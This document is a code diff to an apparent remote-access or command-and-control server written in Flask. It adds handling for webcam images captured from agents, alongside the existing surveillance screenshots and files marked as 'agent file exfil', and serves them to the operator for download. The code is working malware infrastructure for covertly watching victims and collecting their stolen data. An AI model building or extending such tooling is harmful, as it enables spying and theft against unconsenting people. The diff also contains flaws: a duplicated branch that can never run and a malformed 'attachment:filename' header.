@@ -885,6 +885,10 @@ def get_all_results():
                    ('data' in entry['result'] and 'format' in entry['result'] and 
                     entry['result'].get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']):
                     result_type = 'surveillance_screenshot'
+                # Check for webcam data structure
+                elif ('data' in entry['result'] and isinstance(entry['result']['data'], dict) and
+                      'image' in entry['result']['data'] and 'format' in entry['result']['data']):
+                    result_type = 'surveillance_webcam'
                 elif 'type' in entry['result']:
                     result_type = entry['result']['type']
                 elif 'result' in entry['result'] and isinstance(entry['result']['result'], dict):
@@ -981,17 +985,55 @@ def download_result(task_id):
                 
                 # Handle image download
                 if isinstance(result, dict):
-                    # Handle screenshot format: result['result']['image'] and result['result']['format']
+                    # Handle webcam format: result['data']['image'] and result['data']['format']
+                    if 'data' in result and isinstance(result['data'], dict):
+                        webcam_data = result['data']
+                        if 'image' in webcam_data and 'format' in webcam_data:
+                            try:
+                                file_data = base64.b64decode(webcam_data['image'])
+                                file_format = webcam_data['format']
+                                # Check if this is a webcam result by looking at the task type
+                                task_type = entry.get('type', '')
+                                if 'webcam' in task_type.lower():
+                                    filename = f'webcam_{task_id}.{file_format}'
+                                else:
+                                    filename = f'image_{task_id}.{file_format}'
+                                mimetype = f'image/{file_format.lower()}'
+                                return Response(file_data, mimetype=mimetype, headers={
+                                    'Content-Disposition': f'attachment;filename={filename}'
+                                })
+                            except Exception as e:
+                                logging.error(f"Error decoding webcam image: {e}")
+                    
+                    # Handle screenshot format: result['data']['image'] and result['data']['format']
+                    if 'data' in result and isinstance(result['data'], dict):
+                        screenshot_data = result['data']
+                        if 'image' in screenshot_data and 'format' in screenshot_data:
+                            try:
+                                file_data = base64.b64decode(screenshot_data['image'])
+                                file_format = screenshot_data['format']
+                                filename = f'screenshot_{task_id}.{file_format}'
+                                mimetype = f'image/{file_format.lower()}'
+                                return Response(file_data, mimetype=mimetype, headers={
+                                    'Content-Disposition': f'attachment;filename={filename}'
+                                })
+                            except Exception as e:
+                                logging.error(f"Error decoding screenshot image: {e}")
+                    
+                    # Handle legacy screenshot format: result['result']['image'] and result['result']['format']
                     if 'result' in result and isinstance(result['result'], dict):
                         inner_result = result['result']
                         if 'image' in inner_result and 'format' in inner_result:
-                            file_data = base64.b64decode(inner_result['image'])
-                            file_format = inner_result['format']
-                            filename = f'screenshot_{task_id}.{file_format}'
-                            mimetype = f'image/{file_format.lower()}'
-                            return Response(file_data, mimetype=mimetype, headers={
-                                'Content-Disposition': f'attachment;filename={filename}'
-                            })
+                            try:
+                                file_data = base64.b64decode(inner_result['image'])
+                                file_format = inner_result['format']
+                                filename = f'screenshot_{task_id}.{file_format}'
+                                mimetype = f'image/{file_format.lower()}'
+                                return Response(file_data, mimetype=mimetype, headers={
+                                    'Content-Disposition': f'attachment;filename={filename}'
+                                })
+                            except Exception as e:
+                                logging.error(f"Error decoding legacy screenshot image: {e}")
                     
                     # Handle file result where result['data'] is a dict (agent file exfil)
                     if 'data' in result and isinstance(result['data'], dict) and 'data' in result['data']:
@@ -1021,7 +1063,7 @@ def download_result(task_id):
                         if not mimetype:
                             mimetype = 'application/octet-stream'
                         return Response(file_data, mimetype=mimetype, headers={
-                            'Content-Disposition': f'attachment;filename={filename}'
+                            'Content-Disposition': f'attachment:filename={os.path.basename(filename)}'
                         })
                     # Handle dictionary/JSON data
                     content = json.dumps(result, indent=2)
